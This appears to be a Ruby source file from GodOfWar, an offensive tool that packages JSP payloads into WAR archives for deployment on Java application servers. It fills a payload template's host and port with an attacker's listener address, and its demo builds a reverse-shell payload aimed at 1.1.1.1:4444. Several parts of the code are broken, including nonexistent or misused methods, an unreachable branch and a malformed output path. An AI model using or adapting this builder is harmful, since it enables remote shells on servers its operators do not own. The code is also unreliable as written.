#
# KING SABRI | @KINGSABRI
#

require_relative 'payloads'

module GodOfWar
  #
  # Builder module responsible for building base files around GodOfWar
  # ├── cmd.jsp
  # ├── META-INF
  # │   └── MANIFEST.MF
  # │         Manifest-Version: 1.0
  # │         Created-By: 1.6.0_10 (Sun Microsystems Inc.)
  # └── WEB-INF
  #     └── web.xml
  #

  class Builder

    def initialize(payload)
      payloads = GodOfWar::Payloads.new
      @payload = payloads.find_payload(payload)
      yield self
    end

    def structure
      war_file = "#{@payload}.war"
      fix_war_exists(war_file)
      puts '[-] '.bold + "Creating #{war_file} directory structure"
      Dir.mkdir_p("#{@payload}/WEB-INF")
      @war_dir_path = File.absolute_path(@payload)
    end


    # WEB-INF
    # <?xml version="1.0" ?>
    # <web-app xmlns="http://java.sun.com/xml/ns/j2ee"
    #    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    #    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
    #    http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
    #   version="2.4">
    # <servlet>
    #   <servlet-name>PayloadName</servlet-name>
    #   <jsp-file>/payload_file_name.jsp</jsp-file>
    # </servlet>
    # </web-app>
    #
    # build_web_xml builds 'web.xml' file for a given jsp file
    #
    # @return [String]
    #
    def web_xml
      web_xml_war_path = "#{@war_dir_path}/WEB-INF/web.xml"
      web_xml = <<~WEBXML
                  <?xml version="1.0" ?>
                  <web-app xmlns="http://java.sun.com/xml/ns/j2ee"
                     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                     xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
                     http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
                    version="2.4">
                  <servlet>
                    <servlet-name>#{@payload.name.capitalize}</servlet-name>
                    <jsp-file>/#{@payload.name}.jsp</jsp-file>
                  </servlet>
                  </web-app>

                WEBXML

      File.write(web_xml_war_path, web_xml)
    end

    def payload(host, port)
      payload_file      = "#{@payload.path}/#{@payload.name}.jsp"
      payload_war_path  = "#{@war_dir_path}/#{@payload.name}.jsp"
      case
        when host
          payload_raw = File.read(payload_file).sub('HOSTHOST', host).sub('PORTPORT', default[:port])
        when port
          payload_raw = File.read(payload_file).sub('HOSTHOST', default[:host]).sub('PORTPORT', port)
        when host && port
          payload_raw = File.read(payload_file).sub('HOSTHOST', host).sub('PORTPORT', port)
        else
          payload_raw = File.read(payload_file)
      end

      File.write(payload_war_path, payload_raw)
    end

    # build_war build the WAR file by recursively the source directory content then zip it
    def war
      src_dir, dst_war = @war_dir_path, "#{@war_dir_path}../"
      Zip::File.open(dst_war, Zip::File::CREATE) do |zip|
        Dir.glob[File.join(src_dir, '/**/*')].each do |file|
          zip.add(file.sub(src_dir, ''), file)
        end
      end
    end

    private

    # check if the war file exists, rename it if true.
    def fix_war_exists(war_file)
      if File.exist? war_file
        rename = "#{File.basename(war_file, '.war')}_#{Time.now.to_i}.war"
        puts '[-] '.bold + "File #{war_file} Exists, rename '#{war_file}' to '#{rename}'"
        FileUtils.mv(war_file, rename)
      end
    end

    # get default host and port from payload's configurations
    def default
      if @payload.conf["true"]
        {host: @payload.conf["true"]["lhost"].to_s, port: @payload.conf["true"]["lport"].to_s}
      else
        {host: '', port: ''}
      end
    end

  end
end



if __FILE__ == $0
  payload = 'reverse_shell_ui'
  GodOfWar::Builder.new(payload) do |build|
    # p build.structure
    # p build.web_xml
    puts build.payload('1.1.1.1', 4444)
    p build.default
    # p build.war
  end
end

